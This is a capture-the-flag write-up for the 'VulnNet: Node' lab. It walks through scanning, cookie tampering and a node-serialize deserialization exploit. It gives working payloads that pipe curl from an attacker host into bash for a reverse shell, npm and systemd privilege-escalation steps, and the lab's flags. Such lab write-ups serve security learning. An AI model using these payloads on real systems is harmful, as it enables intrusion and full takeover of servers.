> Vulnet: Node

**export IP=10.10.153.159**

# Nmap

nmap -sC -sV -T4 -Pn -T4 -p- -vv -oN nmap/initial $IP

```
8080/tcp open  http    syn-ack Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
```

# Gobuster

sudo gobuster dir -u http://$IP:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x txt,php,sql,bak,zip,tar,bin,cgi -o gobuster/initial

```
/img (Status: 301)
/login (Status: 200)
/css (Status: 301)
/Login (Status: 200)
/IMG (Status: 301)
/CSS (Status: 301)
```

# Nikto

nikto -h http://$IP:8080

```
+ OSVDB-3092: /login/: This might be interesting...
```

Looking at the website we can find some usernames and let's save it to users.txt for fututre use. Let's try to intercept the request and find something interesting.

OOh! Cookies! The cookies looks to be URL encoded then base64 encoded. We are given a session cookie before we are logged in as a valid user. Decoding it we got `{"username":"Guest","isguest":true,"encoding": "utf-8"}`. Let's change the data to admin `{"username":"Admin","isAdmin":true,"encoding": "utf-8"}`. Now enocode to URL encode then to base64. And now we are in as admin but moving to login page we are requested to provide password.

Moving on keep playing with the cookie and if we change the cookie we get an interesting error message.

```
Object.exports.unserialize (/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16)<br> &nbsp; &nbsp;at 
```

We have an unserialize error. Googling it we can find an interesting blog!

```
Untrusted data passed into unserialize() function  in node-serialize module can be exploited to achieve arbitrary code execution by passing a serialized JavaScript Object with an Immediately invoked function expression (IIFE).
```

From referring the article we have a payload for `ls /`

`{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',function(error, stdout, stderr) { console.log(stdout) });\n }()"}`

We can try to ping ourselves and check if the payload works.

## Payload

# Plain Text

```
{"username":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ping -c 1 10.8.107.21',function(error, stdout, stderr) { console.log(stdout) });\n }()","isAdmin":true,"encoding": "utf-8"}
``` 

Encode it as Base64 then URL encode it apply it to session cookie and we can recieve our request in tcpdump.

Time to get a shell! Let's craft a basic bash reverse shell and pass it through curl.

1. Create a reverse shell name rev_shell.sh 
2. Spin a python server 
3. Put curl command in payload.

## Payload

```
{"username":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('curl http://10.8.107.21:8000/rev_shell.sh | bash',function(error, stdout, stderr) { console.log(stdout) });\n }()","isAdmin":true,"encoding": "utf-8"}
```

# Privilege Escalation

sudo -l

```
(serv-manage) NOPASSWD: /usr/bin/npm
```

Referring GTFO bins we can find one.

1. mkdir exploit (in /dev/shm)
2. echo '{"scripts": {"preinstall": "/bin/sh"}}' > exploit/package.json
3. sudo -u serv-manage /usr/bin/npm -C  /dev/shm/exploit --unsafe-perm i

We have a shell as serv-manage!

# user.txt

```
THM{064640a2f880ce9ed7a54886f1bde821}
```

# Priv-Esc as root

sudo -l

```
User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

locate vulnnet-auto.timer => `/etc/systemd/system/vulnnet-auto.timer`

# vulnnet-auto.timer

```
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service => We can check this too!!

[Install]
WantedBy=basic.target
```

/etc/systemd/system/vulnnet-job.service

```
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/df => Let's change this to a curl command `/bin/bash -c curl http://10.8.107.21:8000/rev_shell.sh | bash`

[Install]
WantedBy=multi-user.target
```

And again we have to do some steps to gain a root shell.

1. sudo -u root /bin/systemctl daemon-reload
2. sudo -u root /bin/systemctl stop vulnnet-auto.timer
3. sudo -u root /bin/systemctl start vulnnet-auto.timer

# root.txt

```
THM{abea728f211b105a608a720a37adabf9}
```